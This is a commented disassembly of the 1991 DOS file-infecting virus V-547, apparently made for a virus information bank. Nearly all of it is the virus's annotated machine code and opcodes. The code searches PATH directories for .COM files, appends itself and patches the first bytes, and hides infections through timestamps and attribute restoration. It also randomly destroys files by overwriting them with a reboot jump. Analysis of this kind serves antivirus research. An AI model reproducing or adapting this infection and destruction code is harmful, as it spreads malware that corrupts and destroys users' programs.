;----------------------------------------------
; Virus V-547
;
; Dissasembled: Andrzej Kadlof April 1991
;
; (C) Polish Section of Virus Information Bank
;----------------------------------------------

0100 E9FD00         JMP     0200        ; jump to virus

; ....
; victim code
;====================
; virus entry point

0200 EB03           JMP     0205

0202 49 42 4D                      ; IBM

; set DS to wirus working area

0205 0E             PUSH    CS
0206 58             POP     AX
0207 052000         ADD     AX,0020     ; [0208] is modified for each victim
020A 8ED8           MOV     DS,AX

; restore oryginal first 3 bytes of victim

020C 8B162002       MOV     DX,[0220]
0210 2E89160001     MOV     CS:[0100],DX
0215 8A362202       MOV     DH,[0222]
0219 2E88360201     MOV     CS:[0102],DH

021E B80001         MOV     AX,0100     ; application start address
0221 0E             PUSH    CS          ; store on stack
0222 50             PUSH    AX
0223 33FF           XOR     DI,DI
0225 2E8E062C00     MOV     ES,CS:[002C]        ; segment of environment
022A 51             PUSH    CX
022B FC             CLD
022C 32C0           XOR     AL,AL

022E B90500         MOV     CX,0005     ; length of string
0231 BE1B02         MOV     SI,021B     ; PATH=
0234 F3A6           REPZ    CMPSB
0236 740B           JZ      0243

0238 B9E803         MOV     CX,03E8
023B F2AE           REPNZ   SCASB
023D 26803D00       CMP     BYTE PTR ES:[DI],00
0241 75EB           JNZ     022E

0243 8BF7           MOV     SI,DI
0245 59             POP     CX
0246 51             PUSH    CX
0247 B42C           MOV     AH,2C       ; get time
0249 CD21           INT     21

024B F6C601         TEST    DH,01       ; seconds
024E 7503           JNZ     0253

0250 E9B401         JMP     0407

0253 88365702       MOV     [0257],DH
0257 06             PUSH    ES
0258 B42F           MOV     AH,2F       ; Get DTA
025A CD21           INT     21

025C 891E2802       MOV     [0228],BX
0260 8C062A02       MOV     [022A],ES
0264 07             POP     ES
0265 BA2C02         MOV     DX,022C
0268 B41A           MOV     AH,1A       ; set DTA
026A CD21           INT     21

026C B44E           MOV     AH,4E       ; find first
026E BA2302         MOV     DX,0223
0271 B90800         MOV     CX,0008     ; volume label
0274 CD21           INT     21

0276 7219           JB      0291

0278 813E44022110   CMP     WORD PTR [0244],1021   ; date: 1988 January 1
027E 7511           JNZ     0291

0280 81264202E0FF   AND     WORD PTR [0242],FFE0   ; clear seconds
0286 813E42022008   CMP     WORD PTR [0242],0820   ; time: 01:01:00
028C 7503           JNZ     0291

028E E96A01         JMP     03FB        ; exit to application

; copy founded string to local buffer

0291 BF5802         MOV     DI,0258     ; set buffer address

0294 26803C3B       CMP     BYTE PTR ES:[SI],3B    ; ';' end of string marker
0298 740F           JZ      02A9

029A 26803C00       CMP     BYTE PTR ES:[SI],00    ; end of environment
029E 7409           JZ      02A9

02A0 268A04         MOV     AL,ES:[SI]
02A3 8805           MOV     [DI],AL
02A5 47             INC     DI
02A6 46             INC     SI
02A7 EBEB           JMP     0294        ; copy next character

02A9 81FF5802       CMP     DI,0258     ; path name non empty?
02AD 7509           JNZ     02B8        ; jump if no empty

02AF 26803C00       CMP     BYTE PTR ES:[SI],00  ; end of environment block?
02B3 7403           JZ      02B8        ; jump if yes

02B5 E93801         JMP     03F0        ; no path name, exit

02B8 81FF5802       CMP     DI,0258     ; no path name?
02BC 7412           JZ      02D0        ; jump if yes

02BE 26807CFF5C     CMP     BYTE PTR ES:[SI-01],5C   ; '\'
02C3 740B           JZ      02D0

02C5 26807CFF2F     CMP     BYTE PTR ES:[SI-01],2F   ; '/'
02CA 7404           JZ      02D0

; add directory sign

02CC C6055C         MOV     BYTE PTR [DI],5C ; '\'

; add mask

02CF 47             INC     DI
02D0 C7052A2E       MOV     WORD PTR [DI],2E2A          ; '*.'
02D4 C74502636F     MOV     WORD PTR [DI+02],6F63       ; 'co'
02D9 C745046D00     MOV     WORD PTR [DI+04],006D       ; 'm', 0

02DE B44E           MOV     AH,4E       ; find next
02E0 BA5802         MOV     DX,0258     ; path name + mask
02E3 B90300         MOV     CX,0003     ; hiden and read only
02E6 CD21           INT     21

02E8 7303           JAE     02ED        ; founded

02EA E90301         JMP     03F0        ; search for next path

02ED A14202         MOV     AX,[0242]   ; file time
02F0 241F           AND     AL,1F       ; extract seconds
02F2 3C1F           CMP     AL,1F       ; 62 seconds?
02F4 7463           JZ      0359        ; yes, infected

02F6 833E480200     CMP     WORD PTR [0248],+00  ; high word of file length
02FB 755C           JNZ     0359        ; file too long

02FD 813E460200FA   CMP     WORD PTR [0246],FA00  ; maximum file length
0303 7754           JA      0359

0305 833E46020A     CMP     WORD PTR [0246],+0A   ; minimum file length
030A 724D           JB      0359        ; file too short

; copy file name to local buffer

030C BB4A02         MOV     BX,024A     ; file name
030F B90D00         MOV     CX,000D     ; length of file name in DTA
0312 57             PUSH    DI
0313 8A07           MOV     AL,[BX]
0315 8805           MOV     [DI],AL
0317 43             INC     BX
0318 47             INC     DI
0319 E2F8           LOOP    0313

; clear all attributes (CX = 0)

031B C60500         MOV     BYTE PTR [DI],00    ; end of ASCIIZ string
031E 5F             POP     DI
031F B80143         MOV     AX,4301     ; set file attribute
0322 CD21           INT     21

0324 B8023D         MOV     AX,3D02     ; open file for read/write
0327 CD21           INT     21

0329 722E           JB      0359        ; find next

032B 8BD8           MOV     BX,AX       ; handle
032D A14202         MOV     AX,[0242]   ; file time
0330 241F           AND     AL,1F       ; extract seconds
0332 3C1E           CMP     AL,1E       ; 62?
0334 750A           JNZ     0340

; founded file is infected, with probability 1/16 destroy it

0336 802657020F     AND     BYTE PTR [0257],0F  ; "random" number
033B 740A           JZ      0347        ; destroy file

033D E98400         JMP     03C4        ; restore file data and exit

; with probability 1/8 destroy file

0340 8026570207     AND     BYTE PTR [0257],07
0345 7515           JNZ     035C        ; infect file

;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
; classic Vienna 648 destruction (set firt instruction to JMP F000:FFF0)

0347 B440           MOV     AH,40       ; write file
0349 B90500         MOV     CX,0005
034C BA1302         MOV     DX,0213
034F CD21           INT     21

0351 810E42021F00   OR      WORD PTR [0242],001F
0357 EB6B           JMP     03C4        ; exit

0359 E98B00         JMP     03E7        ; find next

; infect file

035C B43F           MOV     AH,3F       ; read file
035E B90300         MOV     CX,0003     ; 3 bytes
0361 BA2002         MOV     DX,0220     ; to local buffer
0364 CD21           INT     21

0366 725C           JB      03C4        ; reset file data

0368 3D0300         CMP     AX,0003     ; check for error
036B 7557           JNZ     03C4        ; reset file data

036D B80042         MOV     AX,4200     ; move file ptr to BOF
0370 B90000         MOV     CX,0000
0373 BA0000         MOV     DX,0000
0376 CD21           INT     21

0378 724A           JB      03C4        ; reset file data

037A A14602         MOV     AX,[0246]   ; file size
037D 050F00         ADD     AX,000F     ; addjust to paragraph border
0380 25F0FF         AND     AX,FFF0
0383 8BE8           MOV     BP,AX       ; store intermidiate length
0385 2D0300         SUB     AX,0003     ; length of JMP XXXX
0388 A31902         MOV     [0219],AX   ; form JMP XXXX in local buffer
038B B90300         MOV     CX,0003     ; number of bytes
038E BA1802         MOV     DX,0218     ; address of JMP virus_code
0391 B440           MOV     AH,40       ; write file
0393 CD21           INT     21

0395 722D           JB      03C4        ; reset file data

0397 B80242         MOV     AX,4202     ; move file ptr rel EOF
039A 8BD5           MOV     DX,BP       ; addjuseted file length
039C 2B164602       SUB     DX,[0246]   ; real file length
03A0 B90000         MOV     CX,0000     ; high word of file end
03A3 CD21           INT     21

03A5 721D           JB      03C4        ; restore file data

03A7 81C50001       ADD     BP,0100     ; PSP length
03AB B104           MOV     CL,04       ; convert to paragraphs
03AD D3ED           SHR     BP,CL
03AF 892E0800       MOV     [0008],BP   ; automodyfication of virus code
03B3 B92302         MOV     CX,0223     ; virus length
03B6 90             NOP
03B7 BA0000         MOV     DX,0000     ; buffer, start of virus code
03BA B440           MOV     AH,40       ; write file
03BC CD21           INT     21

03BE 810E42021E00   OR      WORD PTR [0242],001E ; set 62 seconds

; restore file time/date stamp

03C4 8B164402       MOV     DX,[0244]   ; restore file date stamp
03C8 8B0E4202       MOV     CX,[0242]   ; restore file time stamp
03CC B80157         MOV     AX,5701     ; set file time/date stamp
03CF CD21           INT     21

03D1 B43E           MOV     AH,3E    ; close file
03D3 CD21           INT     21

; restore file attributes

03D5 B80143         MOV     AX,4301     ; set file attributes
03D8 33C9           XOR     CX,CX
03DA 8A0E4102       MOV     CL,[0241]   ; restore file attributes
03DE BA5802         MOV     DX,0258
03E1 03D6           ADD     DX,SI
03E3 CD21           INT     21

03E5 EB14           JMP     03FB        ; exit

; find next candidate for victim

03E7 B44F           MOV     AH,4F       ; find next
03E9 CD21           INT     21

03EB 7203           JB      03F0        ; search for next path

03ED E9FDFE         JMP     02ED        ; check file

03F0 46             INC     SI
03F1 26807CFF00     CMP     BYTE PTR ES:[SI-01],00  ; end of environment block?
03F6 7403           JZ      03FB        ; yes, exit

03F8 E996FE         JMP     0291        ; search for next path name

; restore DTA

03FB B41A           MOV     AH,1A       ; set DTA
03FD 8B162802       MOV     DX,[0228]
0401 8E1E2A02       MOV     DS,[022A]
0405 CD21           INT     21

; exit to application

0407 33C0           XOR     AX,AX
0409 33DB           XOR     BX,BX
040B 33D2           XOR     DX,DX
040D 33F6           XOR     SI,SI
040F 33FF           XOR     DI,DI
0411 59             POP     CX
0412 CB             RETF

; working area

0413 EAF0FF00F0         ; JMP F000:FFF0  instruction for destruction 
0418 E9 FD 00           ; form new first 3 bytes  (JMP 0518)
041B 50 41 54 48 3D     ; PATH=
0420   db  ?  dup (3)   ; first 3 bytes of victim

; end of code copied to file
;==============================
; working area

0423   db  ?  dup (5)   ; mask of file name for FindFirst
0428   dd  ?            ; address of old DTA
042C   db  ?  dup (2C)  ; local DTA

;  0    db    ?   dup (15h)     ; reserwed   [022C]
; 15h   db    ?                 ; atributte  [0241]
; 16h   dw    ?                 ; time       [0242]
; 18h   dw    ?                 ; date       [0244]
; 1Ah   dd    ?                 ; file size  [0246]
; 1Eh   db    ?  dup (0Dh)      ; file name  [024A] ... [0256]

0457   db  ?            ; system timer seconds
0458   db  ?            ; buffer for path name from environment
